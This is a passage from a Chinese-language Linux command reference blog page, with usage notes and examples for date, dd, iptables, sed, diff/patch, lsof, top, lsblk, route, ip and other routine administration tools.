<li>不加<code>-g</code>放到生产环境，加<code>-g</code>的用于找代码位置</li>
</ul>
<h2 id="10-date-时间工具"><a href="#10-date-时间工具" class="headerlink" title="10. date 时间工具"></a>10. date 时间工具</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 时间计算 ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">时间戳转正常时间格式</span></span><br><span class="line">=&gt; date -d @1587536520</span><br><span class="line">2020年 04月 22日 星期三 14:22:00 CST</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">时间字符串转时间戳</span></span><br><span class="line">=&gt; date -d &quot;20200422&quot; +%s</span><br><span class="line">1587536520</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 查看当前时间 ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">时间格式化</span></span><br><span class="line">=&gt; date +&#x27;%Y-%m-%d %A %H:%M:%S&#x27;</span><br><span class="line">2020-05-08 Friday 19:12:22</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当前时间戳</span></span><br><span class="line">=&gt; date +&#x27;%s&#x27;</span><br><span class="line">1644981572</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 设置当前时间 ##########</span></span></span><br><span class="line">=&gt; date -s @1587536520</span><br></pre></td></tr></table></figure>

<h2 id="11-dd-批量拷贝命令"><a href="#11-dd-批量拷贝命令" class="headerlink" title="11. dd 批量拷贝命令"></a>11. dd 批量拷贝命令</h2><h3 id="11-1-实例"><a href="#11-1-实例" class="headerlink" title="11.1. 实例"></a>11.1. 实例</h3><p><strong>1. 生成大文件</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成指定大小文件，1M一个单位，120个单位，生成到/sftmpfs/test</span></span><br><span class="line">dd if=/dev/zero of=/sftmpfs/test bs=1M count=120</span><br></pre></td></tr></table></figure>

<h2 id="12-watch-监听命令"><a href="#12-watch-监听命令" class="headerlink" title="12. watch 监听命令"></a>12. watch 监听命令</h2><h3 id="12-1-实例"><a href="#12-1-实例" class="headerlink" title="12.1. 实例"></a>12.1. 实例</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">监听内存变化，每秒刷新一次</span></span><br><span class="line">watch -n 1 free -h</span><br></pre></td></tr></table></figure>

<h2 id="13-iptables-防火墙"><a href="#13-iptables-防火墙" class="headerlink" title="13. iptables 防火墙"></a>13. iptables 防火墙</h2><h3 id="13-1-知识填充"><a href="#13-1-知识填充" class="headerlink" title="13.1. 知识填充"></a>13.1. 知识填充</h3><p>查看 <a href="/bookPages/docs/linux-kernel/net/iptables/">iptables原理和源码分析</a></p>
<h3 id="13-2-实例"><a href="#13-2-实例" class="headerlink" title="13.2. 实例"></a>13.2. 实例</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 插入规则 ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-I插入到前面，-A插入到后面</span></span><br><span class="line">iptables -I INPUT -i eth0 -s 200.200.87.48 -p tcp --dport 22 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j DROP</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加输出日志</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">INPUT、OUTPUT、FORWARD都可以在filter表添加日志</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--log-prefix 输出的前缀，可以用来查询</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--log-level 输出级别 0是emerg,1是alert，2是crit，3是err，4是warning，5是notice，6是info，7是debug</span></span><br><span class="line">iptables -I INPUT -i eth0 -p udp --dport 53 -j LOG --log-prefix &quot;input dns: &quot; --log-level 7</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">PREROUTING和POSTROUTING可以在raw或mangle表添加日志，nat添加日志无输出</span></span><br><span class="line">iptables -t raw -A PREROUTING -i eth0 -p udp --dport 53 -j LOG --log-prefix &quot;prerouting dns: &quot; --log-level 7</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 查询规则 ##########</span></span></span><br><span class="line">iptables -t filter -vL INPUT --line-numbers</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 删除规则 ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">line_number是上面查出来的</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这种方式可以删除filter表</span></span><br><span class="line">iptables -t filter -D INPUT [line_number]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">INPUT的nat表可以用下面进行全清</span></span><br><span class="line">iptables -t nat -F INPUT</span><br></pre></td></tr></table></figure>

<h3 id="踩坑记"><a href="#踩坑记" class="headerlink" title="踩坑记"></a>踩坑记</h3><h4 id="1-iptables报错iptables-v1-8-4-nf-tables-Could-not-fetch-rule-set-generation-id-Invalid-argument"><a href="#1-iptables报错iptables-v1-8-4-nf-tables-Could-not-fetch-rule-set-generation-id-Invalid-argument" class="headerlink" title="1) iptables报错iptables v1.8.4 (nf_tables): Could not fetch rule set generation id: Invalid argument"></a>1) iptables报错<code>iptables v1.8.4 (nf_tables): Could not fetch rule set generation id: Invalid argument</code></h4><ul>
<li>是iptables使用了nft模式，修改为legacy就好了，执行命令</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; update-alternatives --config iptables</span><br><span class="line">There are 2 choices for the alternative iptables (providing /usr/sbin/iptables).</span><br><span class="line"></span><br><span class="line">  Selection    Path                       Priority   Status</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">  0            /usr/sbin/iptables-nft      20        auto mode</span><br><span class="line">* 1            /usr/sbin/iptables-legacy   10        manual mode</span><br><span class="line">  2            /usr/sbin/iptables-nft      20        manual mode</span><br></pre></td></tr></table></figure>

<ul>
<li>选择legacy即可</li>
</ul>
<h2 id="14-ls-列举目录"><a href="#14-ls-列举目录" class="headerlink" title="14. ls 列举目录"></a>14. ls 列举目录</h2><h3 id="13-1-选项"><a href="#13-1-选项" class="headerlink" title="13.1. 选项"></a>13.1. 选项</h3><ul>
<li><code>-l</code>: 列表显示详细信息</li>
<li><code>-h</code>: 目录大小加上单位</li>
<li><code>-t</code>: 按照时间排序</li>
<li><code>-S</code>: 按照大小排序</li>
<li><code>-r</code>: 反向排序</li>
</ul>
<h3 id="13-2-时间显示格式修改"><a href="#13-2-时间显示格式修改" class="headerlink" title="13.2. 时间显示格式修改"></a>13.2. 时间显示格式修改</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; export TIME_STYLE=&#x27;+%Y-%m-%d %H:%M:%S&#x27;</span><br><span class="line">=&gt; ls -l test.js</span><br><span class="line">-rw-r--r-- 1 xxx xxx 87 2022-03-07 16:02:09 test.js</span><br></pre></td></tr></table></figure>

<h2 id="15-netstat-网络状态查看"><a href="#15-netstat-网络状态查看" class="headerlink" title="15. netstat 网络状态查看"></a>15. netstat 网络状态查看</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usage: netstat [-vWeenNcCF] [&lt;Af&gt;] -r         netstat &#123;-V|--version|-h|--help&#125;</span><br><span class="line">       netstat [-vWnNcaeol] [&lt;Socket&gt; ...]</span><br><span class="line">       netstat &#123; [-vWeenNac] -i | [-cnNe] -M | -s [-6tuw] &#125;</span><br><span class="line"></span><br><span class="line">        -r, --route              display routing table</span><br><span class="line">        -i, --interfaces         display interface table</span><br><span class="line">        -g, --groups             display multicast group memberships</span><br><span class="line">        -s, --statistics         display networking statistics (like SNMP)</span><br><span class="line">        -M, --masquerade         display masqueraded connections</span><br><span class="line"></span><br><span class="line">        -v, --verbose            be verbose</span><br><span class="line">        -W, --wide               don&#x27;t truncate IP addresses</span><br><span class="line">        -n, --numeric            don&#x27;t resolve names</span><br><span class="line">        --numeric-hosts          don&#x27;t resolve host names</span><br><span class="line">        --numeric-ports          don&#x27;t resolve port names</span><br><span class="line">        --numeric-users          don&#x27;t resolve user names</span><br><span class="line">        -N, --symbolic           resolve hardware names</span><br><span class="line">        -e, --extend             display other/more information</span><br><span class="line">        -p, --programs           display PID/Program name for sockets</span><br><span class="line">        -o, --timers             display timers</span><br><span class="line">        -c, --continuous         continuous listing</span><br><span class="line"></span><br><span class="line">        -l, --listening          display listening server sockets</span><br><span class="line">        -a, --all                display all sockets (default: connected)</span><br><span class="line">        -F, --fib                display Forwarding Information Base (default)</span><br><span class="line">        -C, --cache              display routing cache instead of FIB</span><br><span class="line">        -Z, --context            display SELinux security context for sockets</span><br><span class="line"></span><br><span class="line">  &lt;Socket&gt;=&#123;-t|--tcp&#125; &#123;-u|--udp&#125; &#123;-U|--udplite&#125; &#123;-S|--sctp&#125; &#123;-w|--raw&#125;</span><br><span class="line">           &#123;-x|--unix&#125; --ax25 --ipx --netrom</span><br><span class="line">  &lt;AF&gt;=Use &#x27;-6|-4&#x27; or &#x27;-A &lt;af&gt;&#x27; or &#x27;--&lt;af&gt;&#x27;; default: inet</span><br><span class="line">  List of possible address families (which support routing):</span><br><span class="line">    inet (DARPA Internet) inet6 (IPv6) ax25 (AMPR AX.25)</span><br><span class="line">    netrom (AMPR NET/ROM) ipx (Novell IPX) ddp (Appletalk DDP)</span><br><span class="line">    x25 (CCITT X.25)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>-a</code>: 显示所有连接，包括正在连接的</li>
<li><code>-l</code>: 显示监听的连接，只显示被监听的端口和套接字文件</li>
<li><code>-p</code>: 显示进程名</li>
<li><code>-n</code>: 不把端口自动推测成服务，显示原始端口</li>
</ul>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -tnlp | grep 1234</span><br></pre></td></tr></table></figure>

<h2 id="16-sed-文件查找替换打印"><a href="#16-sed-文件查找替换打印" class="headerlink" title="16. sed 文件查找替换打印"></a>16. sed 文件查找替换打印</h2><ul>
<li>sed命令有点复杂，一直不会用，但是很强大</li>
</ul>
<h3 id="16-1-选项"><a href="#16-1-选项" class="headerlink" title="16.1. 选项"></a>16.1. 选项</h3><ul>
<li><code>-i[suffix]</code>: 替换文件内容，如果定义了suffix，会备份一份到<code>xxxsuffix</code></li>
</ul>
<h3 id="16-2-示例"><a href="#16-2-示例" class="headerlink" title="16.2. 示例"></a>16.2. 示例</h3><p><strong>1. 添加一行</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sed -i &quot;/^start()/a\</span><br><span class="line">	if ! &quot;$&#123;script&#125;&quot; check &quot;$&#123;proc_name&#125;&quot;; then exit 0; fi</span><br><span class="line">&quot; &quot;$&#123;file_name&#125;&quot;</span><br></pre></td></tr></table></figure>

<p><strong>2. 添加多行</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sed -i &quot;/^start()/a\</span><br><span class="line">	if ! \&quot;$&#123;script&#125;\&quot; check \&quot;$&#123;proc_name&#125;\&quot;; then\n\</span><br><span class="line">		/bin/run.sh \&quot;$&#123;file&#125;\&quot; &amp;\n\</span><br><span class="line">		exit 0\n\</span><br><span class="line">	fi</span><br><span class="line">&quot; &quot;$&#123;file_name&#125;&quot;</span><br></pre></td></tr></table></figure>

<p><strong>3. 替换</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将aaa替换成bbb</span></span><br><span class="line">sed -i &quot;s/aaa/bbb/&quot; &quot;$&#123;file_name&#125;&quot;</span><br></pre></td></tr></table></figure>

<p><strong>3. 删除所有的html标签</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sed -i &#x27;s/&lt;[^&gt;]*&gt;//g&#x27; &quot;$&#123;file_name&#125;&quot;</span><br></pre></td></tr></table></figure>

<p><strong>4. 截取文件中间部分</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sed -n &#x27;15,20p&#x27; test.txt</span><br></pre></td></tr></table></figure>

<h3 id="16-3-正则"><a href="#16-3-正则" class="headerlink" title="16.3. 正则"></a>16.3. 正则</h3><ul>
<li><code> *</code>: 匹配空格零次或多次</li>
<li><code> \?</code>: 匹配空格零次或一次</li>
<li><code> \+</code>: 匹配空格一次或多次</li>
</ul>
<h3 id="特殊用法"><a href="#特殊用法" class="headerlink" title="特殊用法"></a>特殊用法</h3><p><strong>1. pattern带大括号，需要转义</strong></p>
<ul>
<li>将大括号单独用单引号包裹，两边闭合单引号</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sed -i &#x27;s/aaa&#x27;&#x27;&#123;&#x27;&#x27;/bbb&#x27;&#x27;&#123;&#x27;&#x27;/&#x27; aaa.txt</span><br></pre></td></tr></table></figure>

<h2 id="17-echo-输出"><a href="#17-echo-输出" class="headerlink" title="17. echo 输出"></a>17. echo 输出</h2><ul>
<li><code>-n</code>: 不换行</li>
<li><code>-e</code>: 解析<code>\n</code>等字符，默认不解析</li>
</ul>
<h2 id="18-diff-patch-差异输出和应用"><a href="#18-diff-patch-差异输出和应用" class="headerlink" title="18. diff &amp; patch 差异输出和应用"></a>18. diff &amp; patch 差异输出和应用</h2><p><strong>diff</strong></p>
<ul>
<li><code>-r</code>: 递归对比文件夹改动</li>
<li><code>-u</code>: 合并的方式输出，类似git diff，用于生成patch</li>
</ul>
<p><strong>git diff</strong></p>
<ul>
<li><code>-w</code>: 忽略空格改动</li>
<li><code>--relative</code>: 相对目录，不使用git绝对目录</li>
</ul>
<p><strong>patch</strong></p>
<ul>
<li><code>-p&lt;n&gt;</code>: 裁剪前导<code>/</code>和目录，p1忽略第一个<code>/</code>，以此类推</li>
<li><code>-l</code>: 忽略空格</li>
<li><code>-i &lt;patch_path&gt;</code>: 输入patch文件</li>
<li><code>--no-backup-if-mismatch</code>: 如果改动不完全，不要备份文件</li>
</ul>
<h3 id="18-1-git改动应用到某个目录上（非git标准目录）"><a href="#18-1-git改动应用到某个目录上（非git标准目录）" class="headerlink" title="18.1 git改动应用到某个目录上（非git标准目录）"></a>18.1 git改动应用到某个目录上（非git标准目录）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">和某个提交做diff，输出到patch文件</span></span><br><span class="line">git diff 09e99a0b6273c26007c16dae48822a6d107eadef -w --relative . &gt; ~/temp/patch</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将patch文件应用到当前目录下</span></span><br><span class="line">patch -p1 -l --no-backup-if-mismatch -i ~/temp/patch</span><br></pre></td></tr></table></figure>

<h3 id="18-2-文件夹改动应用到另一个文件夹"><a href="#18-2-文件夹改动应用到另一个文件夹" class="headerlink" title="18.2 文件夹改动应用到另一个文件夹"></a>18.2 文件夹改动应用到另一个文件夹</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">两个同级目录对比（必须同级，不然应用差异时目录会有问题）</span></span><br><span class="line">diff -ru dir1 dir2 &gt; ~/temp/patch</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入到目录里面，不然patch删除目录会不识别</span></span><br><span class="line">cd dir3</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将patch文件应用到当前目录下</span></span><br><span class="line">patch -p1 -l --no-backup-if-mismatch -i ~/temp/patch</span><br></pre></td></tr></table></figure>

<h2 id="19-fallocate-创建大文件"><a href="#19-fallocate-创建大文件" class="headerlink" title="19. fallocate 创建大文件"></a>19. fallocate 创建大文件</h2><p>fallocate创建的文件仅仅是占用磁盘，没有内容，所以只有很少的I&#x2F;O操作，比dd快很多</p>
<h3 id="19-1-几种基本用法"><a href="#19-1-几种基本用法" class="headerlink" title="19.1. 几种基本用法"></a>19.1. 几种基本用法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建一个10G的文件</span></span><br><span class="line">fallocate -l 10G test.img</span><br></pre></td></tr></table></figure>

<p><strong><font color="red">不知道为什么，fallocate不能重复对一个文件执行，想要重新分配需要手动删除前一个文件</font></strong></p>
<h2 id="20-lsof-查看系统文件占用（包括端口）"><a href="#20-lsof-查看系统文件占用（包括端口）" class="headerlink" title="20. lsof 查看系统文件占用（包括端口）"></a>20. lsof 查看系统文件占用（包括端口）</h2><h3 id="20-1-几种基本用法"><a href="#20-1-几种基本用法" class="headerlink" title="20.1. 几种基本用法"></a>20.1. 几种基本用法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">根据进程号查看端口占用</span></span><br><span class="line">lsof -i | grep [pid]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">根据文件名查看文件占用</span></span><br><span class="line">lsof /path/to/file</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">根据路径查看目录下（不包含子目录）文件占用</span></span><br><span class="line">lsof +d /path/to/dir/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">根据路径查看目录下（包含子目录）文件占用</span></span><br><span class="line">lsof +D /path/to/dir/</span><br></pre></td></tr></table></figure>

<h2 id="21-top-查看系统占用"><a href="#21-top-查看系统占用" class="headerlink" title="21. top 查看系统占用"></a>21. top 查看系统占用</h2><h3 id="21-1-几个快捷键"><a href="#21-1-几个快捷键" class="headerlink" title="21.1. 几个快捷键"></a>21.1. 几个快捷键</h3><ul>
<li><code>Shift + E</code>: 调整内存单位</li>
<li><code>1</code>: 切换cpu统计模式，所有&#x2F;详细</li>
<li><code>Shift + P</code>: cpu占用排序</li>
<li><code>Shift + M</code>: 内存占用排序</li>
<li><code>m</code>: 切换内存显示样式</li>
<li><code>c</code>: 显示进程详细命令</li>
</ul>
<h3 id="21-2-进程状态解析"><a href="#21-2-进程状态解析" class="headerlink" title="21.2. 进程状态解析"></a>21.2. <span id="process_status">进程状态解析</span></h3><ul>
<li>R——Runnable（运行）: 正在运行或在运行队列中等待</li>
<li>S——sleeping（中断）: 休眠中，受阻，在等待某个条件的形成或接收到信号</li>
<li>D——uninterruptible sleep(不可中断): 收到信号不唤醒和不可运行，进程必须等待直到有中断发生</li>
<li>Z——zombie（僵死）: 进程已终止，但进程描述还在，直到父进程调用wait4()系统调用后释放</li>
<li>T——traced or stoppd(停止): 进程收到SIGSTOP,SIGSTP,SIGTOU信号后停止运行</li>
</ul>
<p><strong>后缀表示</strong></p>
<ul>
<li>&lt;: 优先级高的进程</li>
<li>N: 优先级低的进程</li>
<li>L: 有些页被锁进内存</li>
<li>s: 进程的领导者（在它之下有子进程）</li>
<li>l: ismulti-threaded (using CLONE_THREAD, like NPTL pthreads do)</li>
<li>+: 位于后台的进程组</li>
</ul>
<h2 id="22-awk-逐行处理显示"><a href="#22-awk-逐行处理显示" class="headerlink" title="22. awk 逐行处理显示"></a>22. awk 逐行处理显示</h2><h3 id="22-1-几种基本用法"><a href="#22-1-几种基本用法" class="headerlink" title="22.1. 几种基本用法"></a>22.1. 几种基本用法</h3><h3 id="22-2-骚操作实例"><a href="#22-2-骚操作实例" class="headerlink" title="22.2. 骚操作实例"></a>22.2. 骚操作实例</h3><p><strong>1. git计算代码行数</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git diff xxxx --numstat | awk &#x27;&#123;add+=$1;del+=$2&#125; END &#123;print &quot;Add =&quot;,add,&quot;Delete =&quot;,del&#125;&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="23-md5sum-计算MD5"><a href="#23-md5sum-计算MD5" class="headerlink" title="23. md5sum 计算MD5"></a>23. md5sum 计算MD5</h2><h3 id="23-1-几种基本用法"><a href="#23-1-几种基本用法" class="headerlink" title="23.1. 几种基本用法"></a>23.1. 几种基本用法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">计算字符串的md5</span></span><br><span class="line">echo -n &quot;xxx&quot; | md5sum</span><br></pre></td></tr></table></figure>

<h2 id="24-udevadm-系统usb管理"><a href="#24-udevadm-系统usb管理" class="headerlink" title="24. udevadm 系统usb管理"></a>24. udevadm 系统usb管理</h2><h3 id="24-1-几种基本用法"><a href="#24-1-几种基本用法" class="headerlink" title="24.1 几种基本用法"></a>24.1 几种基本用法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">监听usb事件，查看详细信息可以添加选项</span></span><br><span class="line">udevadm monitor --environment --udev</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置日志级别</span></span><br><span class="line">udevadm control --log-priority=debug</span><br></pre></td></tr></table></figure>

<h2 id="25-lsblk-树型查看硬盘分区信息"><a href="#25-lsblk-树型查看硬盘分区信息" class="headerlink" title="25. lsblk 树型查看硬盘分区信息"></a>25. lsblk 树型查看硬盘分区信息</h2><ul>
<li><code>-d</code>: 只显示硬盘，不显示分区</li>
<li><code>-o xxx,xxx</code>: 指定显示列<ul>
<li><code>name</code>: 名字</li>
<li><code>rota</code>: 是否是转动磁盘，也就是机械硬盘。1为机械硬盘；0为固态硬盘</li>
</ul>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; lsblk</span><br><span class="line">NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS</span><br><span class="line">sda      8:0    0 298.1G  0 disk</span><br><span class="line">├─sda1   8:1    0 954.9M  0 part</span><br><span class="line">├─sda2   8:2    0     1K  0 part</span><br><span class="line">├─sda5   8:5    0 198.1G  0 part /home</span><br><span class="line">├─sda6   8:6    0  11.2G  0 part [SWAP]</span><br><span class="line">├─sda7   8:7    0  46.6G  0 part /</span><br><span class="line">└─sda8   8:8    0  41.3G  0 part /opt</span><br><span class="line">=&gt; lsblk -d</span><br><span class="line">NAME MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS</span><br><span class="line">sda    8:0    0 298.1G  0 disk</span><br><span class="line">=&gt; lsblk -d -o name,rota</span><br><span class="line">NAME ROTA</span><br><span class="line">sda     1</span><br></pre></td></tr></table></figure>

<h2 id="26-blkid-查看已挂载的硬盘的uuid信息"><a href="#26-blkid-查看已挂载的硬盘的uuid信息" class="headerlink" title="26. blkid 查看已挂载的硬盘的uuid信息"></a>26. blkid 查看已挂载的硬盘的uuid信息</h2><h2 id="27-tune2fs-修改硬盘uuid"><a href="#27-tune2fs-修改硬盘uuid" class="headerlink" title="27. tune2fs 修改硬盘uuid"></a>27. tune2fs 修改硬盘uuid</h2><h2 id="28-route-更新路由信息"><a href="#28-route-更新路由信息" class="headerlink" title="28. route 更新路由信息"></a>28. route 更新路由信息</h2><h3 id="28-1-一些基本用法"><a href="#28-1-一些基本用法" class="headerlink" title="28.1. 一些基本用法"></a>28.1. 一些基本用法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 查看路由 ##########</span></span></span><br><span class="line">route -n</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 添加路由 ##########</span></span></span><br><span class="line">route add -net 1.1.1.1/24 gw 1.1.1.254</span><br><span class="line">route add -net 1.1.1.1/24 dev eth0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 删除路由 ##########</span></span></span><br><span class="line">route del -net 1.1.1.1/24 gw 1.1.1.254</span><br><span class="line">route del -net 1.1.1.1/24 dev eth0</span><br></pre></td></tr></table></figure>

<h2 id="29-ps-查看系统进程"><a href="#29-ps-查看系统进程" class="headerlink" title="29. ps 查看系统进程"></a>29. ps 查看系统进程</h2><h3 id="29-1-选项含义"><a href="#29-1-选项含义" class="headerlink" title="29.1. 选项含义"></a>29.1. 选项含义</h3><p><strong>参数</strong></p>
<ul>
<li><code>a</code>: 列出所有用户的程序</li>
<li><code>u</code>: 显示所属用户</li>
<li><code>x</code>: 显示所有程序，不加只显示终端控制的程序</li>
<li><code>c</code>: 只显示指令名称</li>
<li><code>f</code>: 使用ascii字符展示关系</li>
<li><code>e</code>: 显示环境变量</li>
<li><code>ww</code>: 显示全，自动换行</li>
</ul>
<h2 id="30-ip-系统网络配置"><a href="#30-ip-系统网络配置" class="headerlink" title="30. ip 系统网络配置"></a>30. ip 系统网络配置</h2><ul>
<li>默认配置ipv4，配置ipv6需要加上<code>-6</code></li>
</ul>
<h3 id="30-1-路由相关"><a href="#30-1-路由相关" class="headerlink" title="30.1. 路由相关"></a>30.1. 路由相关</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">########## 查看路由 ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里查看的是main表</span></span><br><span class="line">=&gt; ip route show</span><br><span class="line">default via 199.200.2.254 dev ens18 proto static metric 100</span><br><span class="line">199.200.0.0/16 dev ens18 proto kernel scope link src 199.200.2.199 metric 100</span><br><span class="line">255.253.254.0/24 dev ens19 proto kernel scope link src 255.253.254.33</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">根据访问ip查看路由</span></span><br><span class="line">=&gt; ip r get 199.200.2.170</span><br><span class="line">199.200.2.170 via 10.240.255.254 dev ens18 src 10.240.17.101 uid 1000</span><br><span class="line">    cache</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看不同路由表，可以查看main、<span class="built_in">local</span></span></span><br><span class="line">=&gt; ip route list table local</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 配置路由 ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置默认路由，需要先将网关的网段指向具体网卡，然后再添加默认路由指定网关地址，仅指定网卡并不能通</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">仅指定网关会导致无法配置网卡作为默认出口，虽然route命令可以</span></span><br><span class="line">ip route add 192.168.0.0/24 dev ens18</span><br><span class="line">ip route add default via 192.168.0.254 dev ens18</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">静态路由</span></span><br><span class="line">ip route add 192.168.0.101/32 via 192.168.0.254 dev enp0s3</span><br></pre></td></tr></table></figure>

<h3 id="30-2-查看网卡ip"><a href="#30-2-查看网卡ip" class="headerlink" title="30.2. 查看网卡ip"></a>30.2. 查看网卡ip</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens18: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    link/ether fe:fc:fe:07:fe:6a brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 199.200.2.199/16 brd 199.200.255.255 scope global noprefixroute ens18</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::34c9:aa6d:8630:e99a/64 scope link noprefixroute</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: ens19: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    link/ether fe:fc:fe:79:83:d5 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet6 2001::199/112 scope global noprefixroute</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::d501:6609:cfd1:9970/64 scope link noprefixroute</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>

<h3 id="30-3-配置网卡"><a href="#30-3-配置网卡" class="headerlink" title="30.3. 配置网卡"></a>30.3. 配置网卡</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启用/禁用网卡</span></span><br><span class="line">ip link set eth0 up</span><br><span class="line">ip link set eth0 down</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">分配ip</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">brd + 根据掩码和ip配置广播地址</span></span><br><span class="line">ip addr add 199.200.1.1/24 brd + dev eth0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">单独配置广播地址</span></span><br><span class="line">ip addr add broadcast 192.168.0.255 dev eth0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除分配的ip</span></span><br><span class="line">ip addr del 192.168.0.10/24 dev eth0</span><br></pre></td></tr></table></figure>

